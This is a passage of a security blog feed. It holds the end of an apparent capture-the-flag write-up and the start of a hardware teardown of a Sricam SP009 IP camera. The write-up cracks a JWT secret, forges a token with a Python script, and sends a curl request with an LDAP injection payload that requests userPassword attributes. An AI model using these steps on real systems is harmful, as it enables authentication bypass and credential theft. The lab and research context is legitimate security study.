&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dept&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Engineering&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;ou&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;elf&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;expires&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2017-08-16 12:00:47.248093+00:00&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;uid&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;alabaster.snowball&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;installing jwt-tool
installing jwt-cracker&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I &lt;span class=&quot;s2&quot;&gt;&quot;abcdefghijklmnopqrstuwxyz&quot;&lt;/span&gt; 6

other characters

&lt;span class=&quot;s2&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;&lt;/span&gt; 6

using jwt_tool with rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
Secret is &lt;span class=&quot;s2&quot;&gt;&quot;3lv3s&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jwt&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;JWT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3lv3s&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;expires&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utcnow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timedelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generated Token: {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;localStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'np-auth'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl 	&lt;span class=&quot;s1&quot;&gt;'http://127.0.0.1:28080/search'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Cookie: SESSION=gt60T0q3W0P52h88k001'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Origin: http://127.0.0.1:28080'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept-Encoding: gzip, deflate, br'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept-Language: en-US,en;q=0.8'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept: */*'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Referer: http://127.0.0.1:28080/home.html'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'X-Requested-With: XMLHttpRequest'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Connection: keep-alive'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E'&lt;/span&gt; 
	&lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'name=))(department%3Dit)(%7C(cn%3D&amp;amp;isElf=False&amp;amp;attributes=profilePath%2Cgn%2Csn%2Cmail%2CuserPassword'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--compressed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>herrfeder</name></author><category term="pentesting" /><category term="hacking" /><summary type="html"></summary></entry><entry><title type="html">Hacking An IPCamera Part1</title><link href="http://localhost:4000/embeddedsec/2017/10/19/Hacking-A-IP-Camera.html" rel="alternate" type="text/html" title="Hacking An IPCamera Part1" /><published>2017-10-19T18:00:00+02:00</published><updated>2017-10-19T18:00:00+02:00</updated><id>http://localhost:4000/embeddedsec/2017/10/19/Hacking-A-IP-Camera</id><content type="html" xml:base="http://localhost:4000/embeddedsec/2017/10/19/Hacking-A-IP-Camera.html">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#sricam-sp009-hardware-and-software-examination&quot; id=&quot;markdown-toc-sricam-sp009-hardware-and-software-examination&quot;&gt;Sricam SP009 Hardware and Software Examination&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-first-recon&quot; id=&quot;markdown-toc-1-first-recon&quot;&gt;1. First Recon&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#11-wifi&quot; id=&quot;markdown-toc-11-wifi&quot;&gt;1.1 WiFi&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#12-soc&quot; id=&quot;markdown-toc-12-soc&quot;&gt;1.2 SoC&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#13-flash&quot; id=&quot;markdown-toc-13-flash&quot;&gt;1.3 Flash&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#14-power-management&quot; id=&quot;markdown-toc-14-power-management&quot;&gt;1.4 Power Management&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#15-sd-card-slot&quot; id=&quot;markdown-toc-15-sd-card-slot&quot;&gt;1.5 SD card slot&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#16-eeprom&quot; id=&quot;markdown-toc-16-eeprom&quot;&gt;1.6 EEPROM&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#17-audio-amplifier&quot; id=&quot;markdown-toc-17-audio-amplifier&quot;&gt;1.7 Audio Amplifier&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#18-shell&quot; id=&quot;markdown-toc-18-shell&quot;&gt;1.8 Shell&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-access-over-hardware-ports&quot; id=&quot;markdown-toc-2-access-over-hardware-ports&quot;&gt;2. Access over Hardware Ports&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#21-uart&quot; id=&quot;markdown-toc-21-uart&quot;&gt;2.1 UART&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#22-getting-firmware&quot; id=&quot;markdown-toc-22-getting-firmware&quot;&gt;2.2 Getting Firmware&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#221-dumping-from-system-via-sdcard&quot; id=&quot;markdown-toc-221-dumping-from-system-via-sdcard&quot;&gt;2.2.1 Dumping from System via SDCard&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#222-dumping-flash-via-spi&quot; id=&quot;markdown-toc-222-dumping-flash-via-spi&quot;&gt;2.2.2 Dumping Flash via SPI&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-acess-over-wireless-interfaces-and-network&quot; id=&quot;markdown-toc-3-acess-over-wireless-interfaces-and-network&quot;&gt;3. Acess over Wireless Interfaces and Network&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#31-internal-communication&quot; id=&quot;markdown-toc-31-internal-communication&quot;&gt;3.1 Internal Communication&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#32-trying-interactingaccessing-the-provided-services&quot; id=&quot;markdown-toc-32-trying-interactingaccessing-the-provided-services&quot;&gt;3.2 Trying Interacting/Accessing the provided services&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#33-external-communication&quot; id=&quot;markdown-toc-33-external-communication&quot;&gt;3.3 External Communication&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#331-communication-between-mobile-phone-and-ipcam&quot; id=&quot;markdown-toc-331-communication-between-mobile-phone-and-ipcam&quot;&gt;3.3.1 Communication between Mobile Phone and IPCam&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#332-firmware-update&quot; id=&quot;markdown-toc-332-firmware-update&quot;&gt;3.3.2 Firmware Update&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#334-direct-communication-between-ipcam-and-servers&quot; id=&quot;markdown-toc-334-direct-communication-between-ipcam-and-servers&quot;&gt;3.3.4 Direct Communication between IPCam and servers&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#335-collecting-information&quot; id=&quot;markdown-toc-335-collecting-information&quot;&gt;3.3.5 Collecting Information&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-reversing&quot; id=&quot;markdown-toc-4-reversing&quot;&gt;4. Reversing&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#41-jadx&quot; id=&quot;markdown-toc-41-jadx&quot;&gt;4.1 JADX&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#42-apktool&quot; id=&quot;markdown-toc-42-apktool&quot;&gt;4.2 APKTOOL&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#43-unzip-the-apk&quot; id=&quot;markdown-toc-43-unzip-the-apk&quot;&gt;4.3 Unzip the APK&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#44-bytecode-viewer&quot; id=&quot;markdown-toc-44-bytecode-viewer&quot;&gt;4.4 Bytecode Viewer&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#overall-security-issues-for-now&quot; id=&quot;markdown-toc-overall-security-issues-for-now&quot;&gt;Overall Security Issues (for now)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#conclusion&quot; id=&quot;markdown-toc-conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sricam-sp009-hardware-and-software-examination&quot;&gt;Sricam SP009 Hardware and Software Examination&lt;/h1&gt;

&lt;p&gt;In this gist I will try to examine and exploit the Sricam SP009. I purchased it from Attify with the IOT Exploitation Kit.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;First Recon
    &lt;ul&gt;
      &lt;li&gt;doing Research on Manufacturer Details&lt;/li&gt;
      &lt;li&gt;disassemble the ip-camera&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Access over Harware Ports
    &lt;ul&gt;
      &lt;li&gt;get shell access&lt;/li&gt;
      &lt;li&gt;dump the firmware&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Acess over Wireless Interfaces and Network
    &lt;ul&gt;
      &lt;li&gt;use interfaces in intended manner and dump network exchange information&lt;/li&gt;
      &lt;li&gt;scan network services on cam and servers&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reversing Android App
    &lt;ul&gt;
      &lt;li&gt;finding firmware and keys for further access encryption&lt;/li&gt;
      &lt;li&gt;vulnerabilities&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;1-first-recon&quot;&gt;1. First Recon&lt;/h2&gt;

&lt;p&gt;There isn’t any manufactural ID on the Cam. So seaching for the product will probably give the necessary documents.
http://www.sricam.com/product/id/07caa85ec45449fabc17c003345970bf.html
http://www.sricam.com/download/id/3e984aa70a9d4e928b03c01787d6fb4f.html&lt;/p&gt;

&lt;p&gt;I wasn’t able of extracting any relevant FCCID, only for similiar models like SP022.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/6UA9B3B.png&quot; title=&quot;Product Photo SP009&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/6UA9B3B.png&quot; alt=&quot;Product Photo SP009&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Product Photo SP009&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;Examing product without opening it reveals a 720p camera module, IR sensor, LED’s for indicating running system, SD card slot and a reset button.
On the backshell of the camera is a sticker with the ID (probably for database issues) and the default password.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;

	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/6UA9B3B.png&quot; title=&quot;Covering with product sticker&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image1&quot; src=&quot;http://i.imgur.com/XAjB0hf.jpg&quot; alt=&quot;Covering with product sticker&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Covering with product sticker&lt;/p&gt;
	
	&lt;/div&gt;
	&lt;div class=&quot;image-wrapper-double&quot;&gt;
	&lt;a href=&quot;http://i.imgur.com/6UA9B3B.png&quot; title=&quot;Inside view of covering with speaker&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image2&quot; src=&quot;http://i.imgur.com/d09zn5q.jpg&quot; alt=&quot;Inside view of covering with speaker&quot; /&gt;
	&lt;/a&gt;
	
	&lt;p class=&quot;image-caption&quot;&gt;Inside view of covering with speaker&lt;/p&gt;
	
	&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;On the inner side of the backshell lies a small speaker. It was my first action to plug it off the main board, because it does annoying beeps when not paired with the smartphone app.&lt;/p&gt;

&lt;p&gt;The main board reveals all the parts for the functionalities of the cam.&lt;/p&gt;
&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/Y7b0J4q.jpg&quot; title=&quot;PCB front with assembly of parts&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/Y7b0J4q.jpg&quot; alt=&quot;PCB front with assembly of parts&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;PCB front with assembly of parts&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;h4 id=&quot;11-wifi&quot;&gt;1.1 WiFi&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: https://www.mediatek.com/products/broadbandWifi/mt7601u&lt;/li&gt;
  &lt;li&gt;Identifier: MT7601UN 1530-BMJL GTP39Y55&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;According to mediatek “High-performance 802.11n for compact and cost-effective Wi-Fi devices”. Provides network connectivity for the cam and will communicate with the main processor via SPI.?&lt;/p&gt;

&lt;h4 id=&quot;12-soc&quot;&gt;1.2 SoC&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: http://www.grain-media.com/html/8136S_8135S.htm&lt;/li&gt;
  &lt;li&gt;Identifier: GM8 135S-OC SMSKH-000 AG-1525&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/IPcaKkf.jpg&quot; title=&quot;SoC architecture&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/IPcaKkf.jpg&quot; alt=&quot;SoC architecture&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;SoC architecture&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;We can see that it’s a ARM architecture and it has a lot of interfaces.
Next to the SoC lies the suspected UART interface.&lt;/p&gt;
&lt;h4 id=&quot;13-flash&quot;&gt;1.3 Flash&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: http://html.alldatasheet.com/html-pdf/575542/MCNIX/MX25L12835E/1114/7/MX25L12835E.html (similiar model)&lt;/li&gt;
  &lt;li&gt;Identifier: MX25L12805E (on the chip is MX25L12805D printed)&lt;/li&gt;
  &lt;li&gt;Name: 16M-BIT [x 1] CMOS SERIAL FLASH&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/y9UWskY.jpg&quot; title=&quot;Flash pinout&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/y9UWskY.jpg&quot; alt=&quot;Flash pinout&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Flash pinout&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;It’s surprising that although there is printed MX25L12805E, it’s the chip MX25L12805D. They varies in pinning and flash size. 
This flash stores the operating system and all binaries and other files for operation. Looking later at the booting prompt will reveal it’s real “type”. We will examine later, whether it’s possible to get some information out of the chip via SPI.&lt;/p&gt;

&lt;h4 id=&quot;14-power-management&quot;&gt;1.4 Power Management&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: http:/A3/www.everanalog.com/Product/ProductEA3036DetailInfo.aspx&lt;/li&gt;
  &lt;li&gt;Identifier:  EA3036 4j088s&lt;/li&gt;
  &lt;li&gt;Name: 3CH power management IC&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Provides the driver circuit for the Power Management. Very Important for function of the cam but not really interesting for examination.&lt;/p&gt;

&lt;h4 id=&quot;15-sd-card-slot&quot;&gt;1.5 SD card slot&lt;/h4&gt;

&lt;p&gt;Looks like a typical reader for microSD cards like used on Raspberry Pi. I guess, it could be used to store videos and pictures, captured by the camera. It will become useful to copy things from the filesystem and maybe executing external binaries.&lt;/p&gt;

&lt;p&gt;On the back of the main board are some other parts.&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/2wa6WmI.jpg&quot; title=&quot;PCB backside&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/2wa6WmI.jpg&quot; alt=&quot;PCB backside&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;PCB backside&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;h4 id=&quot;16-eeprom&quot;&gt;1.6 EEPROM&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: http://www.celtor.pl/2447,24c04d-eeprom-szeregowa-4kb-512bx-so8.html&lt;/li&gt;
  &lt;li&gt;Identifier: 24c04d 538b1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Like the Flash it should communicate via SPI with the main processor. The EEPROM stores the Bootloader that will provide the program to load the operating system from the Flash.
It’s much smaller with only 16kB.
When it’s not possible to read the Flash, I would continue with the EEPROM.&lt;/p&gt;

&lt;h4 id=&quot;17-audio-amplifier&quot;&gt;1.7 Audio Amplifier&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Link: http://www.inkocean.in/the-md8002a-8002a-sop8-smd-3w-audio-amplifier-ic-chip&lt;/li&gt;
  &lt;li&gt;Identifier: 8002a swire15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can find this part on the board two times. It will amplify the audio signal from the DAC to hearable power level. Won’t be in our focus, either.&lt;/p&gt;

&lt;h4 id=&quot;18-shell&quot;&gt;1.8 Shell&lt;/h4&gt;

&lt;p&gt;The WiFi antenna is stucked in the front shell of the camera.&lt;/p&gt;
&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/MwJ3CNj.jpg&quot; title=&quot;Front covering with attached WiFi antenna&quot; target=&quot;_blank&quot;&gt;
